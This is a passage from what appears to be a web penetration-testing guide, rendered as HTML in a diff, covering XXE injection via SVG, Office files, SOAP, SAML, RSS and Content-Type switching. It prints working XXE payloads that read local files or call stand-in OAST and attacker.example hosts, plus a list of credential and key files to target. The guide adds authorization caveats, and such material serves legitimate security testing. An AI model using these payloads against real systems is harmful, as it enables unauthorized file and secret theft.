+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;20&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<p>Check:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>image preview
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>converted PNG/JPG
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>metadata extraction
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>thumbnail generation
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>admin preview
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>PDF export containing SVG
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>OAST callbacks
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>server-side error messages
+</span></code></pre></div>
+<p>Important:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>If SVG is only served back to the browser, the issue may be client-side SVG/XSS, not server-side XXE.
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>Confirm server-side parsing with OAST or server-rendered output.
+</span></code></pre></div>
+<hr />
+<h2 id="xxe-via-office-documents">XXE via Office Documents</h2>
+<p>DOCX, XLSX, and PPTX are ZIP archives containing XML files.</p>
+<p>Testing flow:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>1. Create a normal DOCX/XLSX/PPTX.
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>2. Unzip it.
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>3. Modify an internal XML file.
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>4. Add an XXE callback payload.
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>5. Zip the document back correctly.
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>6. Upload it to the target feature.
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>7. Monitor OAST callbacks.
+</span></code></pre></div>
+<p>Common internal files:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>word/document.xml
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>xl/workbook.xml
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>xl/sharedStrings.xml
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>ppt/presentation.xml
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>[Content_Types].xml
+</span></code></pre></div>
+<p>Example XML insert:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/office&quot;&gt;</span>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>]&gt;
+</span></code></pre></div>
+<p>Then reference:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="ni">&amp;xxe;</span>
+</span></code></pre></div>
+<p>Check features such as:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>document import
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>spreadsheet import
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>document preview
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>metadata extraction
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>text extraction
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>virus scanning pipeline
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>PDF conversion
+</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a>search indexing
+</span></code></pre></div>
+<p>This is often second-order because processing may happen asynchronously.</p>
+<hr />
+<h2 id="xxe-via-soap">XXE via SOAP</h2>
+<p>SOAP APIs commonly use XML.</p>
+<p>Normal SOAP shape:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="nt">&lt;soap:Envelope</span><span class="w"> </span><span class="na">xmlns:soap=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="w">  </span><span class="nt">&lt;soap:Body&gt;</span>
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="w">    </span><span class="nt">&lt;getUser&gt;</span>
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="w">      </span><span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
+</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="w">    </span><span class="nt">&lt;/getUser&gt;</span>
+</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="w">  </span><span class="nt">&lt;/soap:Body&gt;</span>
+</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="nt">&lt;/soap:Envelope&gt;</span>
+</span></code></pre></div>
+<p>XXE test:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>]&gt;
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="nt">&lt;soap:Envelope</span><span class="w"> </span><span class="na">xmlns:soap=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="w">  </span><span class="nt">&lt;soap:Body&gt;</span>
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="w">    </span><span class="nt">&lt;getUser&gt;</span>
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="w">      </span><span class="nt">&lt;id&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/id&gt;</span>
+</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="w">    </span><span class="nt">&lt;/getUser&gt;</span>
+</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="w">  </span><span class="nt">&lt;/soap:Body&gt;</span>
+</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a><span class="nt">&lt;/soap:Envelope&gt;</span>
+</span></code></pre></div>
+<p>Try OAST if output is not reflected:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="cp">  &lt;!ENTITY % xxe SYSTEM &quot;http://xxe-test-73921.oast.example/soap&quot;&gt;</span>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="w">  </span>%xxe;
+</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a>]&gt;
+</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="nt">&lt;soap:Envelope</span><span class="w"> </span><span class="na">xmlns:soap=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="w">  </span><span class="nt">&lt;soap:Body&gt;</span>
+</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="w">    </span><span class="nt">&lt;getUser&gt;</span>
+</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="w">      </span><span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
+</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a><span class="w">    </span><span class="nt">&lt;/getUser&gt;</span>
+</span><span id="__span-57-11"><a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="w">  </span><span class="nt">&lt;/soap:Body&gt;</span>
+</span><span id="__span-57-12"><a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="nt">&lt;/soap:Envelope&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="xxe-via-saml">XXE via SAML</h2>
+<p>SAML messages are XML and may be parsed by identity or service providers.</p>
+<p>Targets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>SAMLResponse
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>SAMLRequest
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>metadata XML import
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>IdP metadata
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>SP metadata
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>single sign-on integrations
+</span></code></pre></div>
+<p>Basic idea:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/saml&quot;&gt;</span>
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>]&gt;
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="nt">&lt;samlp:Response&gt;</span>
+</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="w">  </span>...
+</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="nt">&lt;/samlp:Response&gt;</span>
+</span></code></pre></div>
+<p>SAML parsers often validate signatures, schemas, and strict XML structures. XXE may be blocked by hardened libraries, but metadata import features are still worth checking.</p>
+<p>Safe testing:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>use test IdP/SP
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>do not break production SSO
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>prefer metadata import in staging
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>monitor OAST callbacks
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>avoid credential-bearing real assertions
+</span></code></pre></div>
+<hr />
+<h2 id="xxe-via-rss-atom-feeds">XXE via RSS / Atom Feeds</h2>
+<p>Feed importers parse XML from remote URLs.</p>
+<p>Payload in RSS:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="cp">&lt;!DOCTYPE rss [</span>
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/rss&quot;&gt;</span>
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>]&gt;
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a><span class="nt">&lt;rss</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;2.0&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="w">  </span><span class="nt">&lt;channel&gt;</span>
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a><span class="w">    </span><span class="nt">&lt;title&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/title&gt;</span>
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a><span class="w">    </span><span class="nt">&lt;link&gt;</span>https://example.com<span class="nt">&lt;/link&gt;</span>
+</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>test<span class="nt">&lt;/description&gt;</span>
+</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a><span class="w">  </span><span class="nt">&lt;/channel&gt;</span>
+</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a><span class="nt">&lt;/rss&gt;</span>
+</span></code></pre></div>
+<p>Targets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>blog feed importer
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>newsletter importer
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>RSS reader
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>podcast importer
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>content syndication
+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>admin feed preview
+</span></code></pre></div>
+<p>This may also combine with SSRF if the application fetches attacker-controlled feed URLs.</p>
+<hr />
+<h2 id="xxe-via-content-type-switching">XXE via Content-Type Switching</h2>
+<p>Some endpoints accept JSON by default but also parse XML if the <code>Content-Type</code> changes.</p>
+<p>Original JSON request:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="nf">POST</span> <span class="nn">/api/user</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>
+</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a><span class="p">{</span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;alice&quot;</span><span class="p">}</span>
+</span></code></pre></div>
+<p>Try XML:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="nf">POST</span> <span class="nn">/api/user</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/xml</span>
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="cp">  &lt;!ENTITY marker &quot;xxe-test-73921&quot;&gt;</span>
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>]&gt;
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;marker;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>Also try:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>text/xml
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>application/xml
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>application/soap+xml
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>application/xhtml+xml
+</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>image/svg+xml
+</span></code></pre></div>
+<p>Watch for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>different parser errors
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>same endpoint accepting XML
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>automatic XML binding
+</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>framework-level XML deserialization
+</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>different behavior based on Accept header
+</span></code></pre></div>
+<hr />
+<h2 id="common-file-targets">Common File Targets</h2>
+<p>Use harmless files first.</p>
+<p>Linux:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>/etc/hostname
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>/etc/issue
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>/proc/version
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a>/proc/self/cmdline
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>/proc/self/environ
+</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>/etc/passwd
+</span></code></pre></div>
+<p>Windows:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>C:\Windows\System32\drivers\etc\hosts
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>C:\Windows\win.ini
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>C:\boot.ini
+</span></code></pre></div>
+<p>Application files, only if authorized:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>.env
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>config.yml
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>application.properties
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a>settings.py
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>web.config
+</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a>database.yml
+</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a>docker-compose.yml
+</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a>kubernetes service account token
+</span></code></pre></div>
+<p>High-sensitivity targets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>private keys
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>cloud credentials
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>database passwords
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>session secrets
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>JWT signing keys
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>/etc/shadow
+</span></code></pre></div>
+<p>Do not extract high-sensitivity files unless explicitly allowed.</p>
+<hr />
+<h2 id="php-wrapper-tricks">PHP Wrapper Tricks</h2>
+<p>In PHP-based XML parsing contexts, wrappers may be useful.</p>
+<p>Base64 file read:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hostname&quot;&gt;</span>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>]&gt;
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Why useful:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>binary or special characters may break XML output
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>base64 can make file output safer to transport
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>some files contain invalid XML characters
+</span></code></pre></div>
+<p>Only applies when the parser/runtime supports PHP stream wrappers.</p>
+<hr />
+<h2 id="java-specific-notes">Java-Specific Notes</h2>
+<p>Java XML parsers may support URL handlers such as:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>file://
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>http://
+</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>https://
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>ftp://
+</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>jar:
+</span></code></pre></div>
+<p>JAR protocol examples:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>jar:file:///path/to/archive.zip!/file.txt
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>jar:http://attacker.example/archive.zip!/file.txt
+</span></code></pre></div>
+<p>Potential Java signals:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>SAXParseException
